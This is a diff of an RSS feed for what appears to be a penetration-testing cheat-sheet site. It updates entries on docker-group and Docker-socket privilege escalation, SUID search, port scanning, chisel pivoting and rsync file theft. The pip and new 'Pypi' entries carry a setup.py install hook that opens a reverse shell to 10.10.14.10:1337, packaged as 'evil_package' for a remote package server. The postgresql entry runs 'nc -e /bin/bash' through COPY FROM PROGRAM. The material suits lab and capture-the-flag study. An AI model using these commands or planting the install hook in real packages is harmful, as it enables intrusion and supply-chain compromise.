@@ -138,7 +138,7 @@
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description> Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root </description>
+      <description>Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.sock http://localhost/images/json # Create container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --data-binary &amp;#39;{&amp;#34;Image&amp;#34;: &amp;#34;&amp;lt;image_name&amp;gt;:latest&amp;#34;,&amp;#34;HostConfig&amp;#34;: {&amp;#34;Binds&amp;#34;: [&amp;#34;/:/r&amp;#34;]}, &amp;#34;Cmd&amp;#34;: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;ls -la /r/root/&amp;#34;], &amp;#34;Tty&amp;#34;: true}&amp;#39; --unix-socket /var/run/docker.sock http://localhost/containers/create # Start container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --unix-socket /var/run/docker.</description>
     </item>
     <item>
       <title>Docker Registry</title>
@@ -194,7 +194,7 @@
       <link>https://tldrbins.github.io/find/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/find/</guid>
-      <description>Locate a file locate cmd.php Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
+      <description>Locate a file locate cmd.php Find files of type file find . -type f Find and Open find / -name test.txt -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by user find / -user user -ls 2&amp;gt;/dev/null | grep -v -e &amp;#34; \/proc&amp;#34; -e &amp;#34; \/sys&amp;#34; Find files owned by group find / -group adm 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
     </item>
     <item>
       <title>Find (Windows)</title>
@@ -516,7 +516,7 @@
       <link>https://tldrbins.github.io/network_discovery/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_discovery/</guid>
-      <description> Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Sniff Network Traffic # For example: on port 389 tcpdump -i lo -nnXs 0 &amp;#39;port 389&amp;#39; Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do (nc -zvn 127.0.0.1 ${i} 2&amp;gt;&amp;amp;1 | grep -v &amp;#34;Connection refused&amp;#34; &amp;amp;); done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig ip addr cat /proc/net/fib_trie # Windows ipconfig Check Network Connections # TCP netstat -plant # UDP netstat -plunt # If netstat not present cat /proc/net/tcp | grep &amp;#39;00000000:0000 0A&amp;#39; # Windows netstat -ano </description>
+      <description> Test Connectivity ping -c3 10.10.11.10 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Sniff Network Traffic # For example: on port 389 tcpdump -i lo -nnXs 0 &amp;#39;port 389&amp;#39; Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do (nc -zvn 127.0.0.1 ${i} 2&amp;gt;&amp;amp;1 | grep -v &amp;#34;Connection refused&amp;#34; &amp;amp;); done Check ARP arp -na cat /proc/net/arp Check IP # Linux ifconfig ip addr cat /proc/net/fib_trie # Windows ipconfig Check Network Connections # TCP netstat -plant # UDP netstat -plunt # If netstat not present cat /proc/net/tcp | grep &amp;#39;00000000:0000 0A&amp;#39; ss -tnl # Windows netstat -ano </description>
     </item>
     <item>
       <title>Network Traffic Pivoting</title>
@@ -524,6 +524,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
       <description>Chisel Download chisel&#xA;Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
+    </item>
+    <item>
+      <title>Nginx</title>
+      <link>https://tldrbins.github.io/nginx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/nginx/</guid>
+      <description> Config location /etc/nginx/sites-enabled </description>
     </item>
     <item>
       <title>Nmap</title>
@@ -593,7 +600,7 @@
       <link>https://tldrbins.github.io/pip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/pip/</guid>
-      <description> Privesc #!/usr/bin/env python3 from setuptools import setup from setuptools.command.install import install import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) # Run sudo pip install . </description>
+      <description> SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
     </item>
     <item>
       <title>POP3</title>
@@ -615,6 +622,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/postgresql/</guid>
       <description>General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database Basic Commands # Show databases \list # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+    </item>
+    <item>
+      <title>Pypi</title>
+      <link>https://tldrbins.github.io/pypi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/pypi/</guid>
+      <description>Abuse Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;10.10.14.10&amp;#34;,1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@example.com&amp;#34;, url=&amp;#34;http://example.com&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
     </item>
     <item>
       <title>Python Decompile</title>
@@ -649,7 +663,7 @@
       <link>https://tldrbins.github.io/rsync/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/rsync/</guid>
-      <description>Basic Commands # List directory (&amp;#39;/&amp;#39;) with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/ # List a file with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd # List files (wildcard) with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync* # Get a file with ipv6 rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd . # Get files (wildcard) with ipv6 rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=password; rsync -aR .ssh/ rsync://user@[dead:beef::1234:5678:90ab:cdef]:8730/home_user/ Bruteforce rsync password # Check user from /etc/passwd, module from /etc/rsyncrsyncd.</description>
+      <description>Basic Commands # List directory (&amp;#39;/&amp;#39;) rsync --list-only -a rsync://10.10.11.10/ # List directory (&amp;#39;/&amp;#39;) with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/ # List a file rsync --list-only -a rsync://10.10.11.10/etc/passwd # List files (wildcard) rsync --list-only -a rsync://10.10.11.10/etc/rsync* # Get a file rsync -a rsync://10.10.11.10/etc/passwd . # Get files (wildcard) rsync -a rsync://10.10.11.10/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=password; rsync -aR .ssh/ rsync://user@10.10.11.10/home_user/ Bruteforce rsync password # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.</description>
     </item>
     <item>
       <title>Runas</title>
